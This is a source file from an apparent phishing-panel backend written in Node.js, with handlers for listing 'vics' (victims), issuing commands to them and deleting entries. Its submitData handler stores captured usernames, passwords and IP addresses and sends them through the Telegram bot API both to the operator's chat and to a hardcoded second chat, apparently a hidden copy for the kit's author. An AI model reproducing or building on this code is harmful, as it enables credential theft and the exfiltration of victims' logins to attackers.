var moment = require("moment"); // require
const Panel = require("../models/panelModel");
const axios = require("axios");

const getOwnerVics = async (req, res) => {
	const { owner, panelName } = req.params;
	Panel.find({ owner, panelName })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, panelName } = req.body;
	try {
		await Panel.findOneAndUpdate({ uniqueid, panelName }, req.body).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid, panelName } = req.params;
	Panel.findOne({ uniqueid, panelName }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitData = async (req, res) => {
	const { username, password, uniqueid, owner, ip, telegramId } = req.body;
	try {
		let user = await Panel.create({
			uniqueid,
			username,
			password,
			status: 1,
			owner,
			ip,
			timestamp: moment().format(),
		});
		let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}`;
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: telegramId,
					text: `OP:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: 680379375,
					text: `OP:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid, panelName } = req.body;
	try {
		await Panel.deleteOne({ uniqueid, panelName });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	getInfo,
	deleteEntry,
	submitData,
	command,
};
